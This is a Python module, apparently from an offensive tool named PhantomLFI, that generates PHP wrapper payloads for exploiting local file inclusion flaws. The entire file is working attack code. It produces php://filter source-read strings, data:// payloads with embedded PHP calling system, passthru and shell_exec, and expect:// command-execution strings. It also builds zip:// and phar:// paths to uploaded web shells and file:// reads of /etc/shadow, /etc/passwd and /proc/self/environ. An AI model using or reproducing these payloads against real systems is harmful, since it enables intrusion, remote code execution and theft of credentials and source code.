"""
PHP wrapper payload generator for PhantomLFI.
Done by D4rk0ps
"""

import base64
import urllib.parse

from config.default_targets import PHP_WRAPPER_TARGETS


def generate_php_filter_payloads(targets: list = None) -> list:
    """Generate php://filter payloads for reading source code."""
    if targets is None:
        targets = PHP_WRAPPER_TARGETS

    payloads = []
    filters = [
        "convert.base64-encode",
        "string.rot13",
        "convert.iconv.utf-8.utf-16",
        "string.toupper",
        "string.tolower",
    ]

    for target in targets:
        for filt in filters:
            payloads.append(f"php://filter/{filt}/resource={target}")
            if filt == "convert.base64-encode":
                payloads.append(
                    f"php://filter/{filt}|string.rot13/resource={target}"
                )
        payloads.append(f"php://filter/resource={target}")

    return payloads


def generate_php_input_payloads() -> list:
    """Generate php://input payloads."""
    return [
        "php://input",
        "php://input%00",
        urllib.parse.quote("php://input", safe=""),
    ]


def generate_data_wrapper_payloads() -> list:
    """Generate data:// wrapper payloads."""
    commands = [
        "<?php system('id'); ?>",
        "<?php phpinfo(); ?>",
        "<?php echo file_get_contents('/etc/passwd'); ?>",
        "<?php passthru('whoami'); ?>",
        "<?php echo shell_exec('ls -la'); ?>",
    ]

    payloads = []
    for cmd in commands:
        payloads.append(
            f"data://text/plain,{urllib.parse.quote(cmd, safe='')}"
        )
        encoded = base64.b64encode(cmd.encode()).decode()
        payloads.append(f"data://text/plain;base64,{encoded}")

    return payloads


def generate_expect_payloads() -> list:
    """Generate expect:// wrapper payloads."""
    commands = [
        "id", "whoami", "uname -a", "cat /etc/passwd",
        "ls -la", "pwd", "ifconfig", "ip addr",
    ]

    payloads = []
    for cmd in commands:
        payloads.append(f"expect://{cmd}")
        payloads.append(f"expect://{urllib.parse.quote(cmd, safe='')}")

    return payloads


def generate_zip_payloads() -> list:
    """Generate zip:// wrapper payloads."""
    zip_paths = [
        "/tmp/shell.zip",
        "/var/www/html/uploads/shell.zip",
        "/var/www/html/images/shell.zip",
    ]
    inner_files = ["shell.php", "cmd.php", "rce.php"]

    payloads = []
    for zip_path in zip_paths:
        for inner in inner_files:
            payloads.append(f"zip://{zip_path}%23{inner}")
            payloads.append(f"zip://{zip_path}#{inner}")

    return payloads


def generate_phar_payloads() -> list:
    """Generate phar:// wrapper payloads."""
    phar_paths = [
        "/tmp/shell.phar",
        "/var/www/html/uploads/shell.phar",
        "/var/www/html/uploads/shell.jpg",
        "/var/www/html/uploads/shell.gif",
    ]
    inner_files = ["shell.php", "test.txt"]

    payloads = []
    for phar_path in phar_paths:
        for inner in inner_files:
            payloads.append(f"phar://{phar_path}/{inner}")

    return payloads


def generate_file_wrapper_payloads() -> list:
    """Generate file:// wrapper payloads."""
    targets = [
        "/etc/passwd", "/etc/shadow", "/etc/hosts",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
    ]

    payloads = []
    for target in targets:
        payloads.append(f"file://{target}")
        payloads.append(f"file:///{target.lstrip('/')}")

    return payloads


def generate_all_wrapper_payloads() -> dict:
    """Generate all PHP wrapper payloads grouped by category."""
    return {
        "php://filter (Source Read)": generate_php_filter_payloads(),
        "php://input (POST Injection)": generate_php_input_payloads(),
        "data:// (Inline Execution)": generate_data_wrapper_payloads(),
        "expect:// (Command Execution)": generate_expect_payloads(),
        "zip:// (Archive Traversal)": generate_zip_payloads(),
        "phar:// (Deserialization)": generate_phar_payloads(),
        "file:// (Direct Access)": generate_file_wrapper_payloads(),
    }
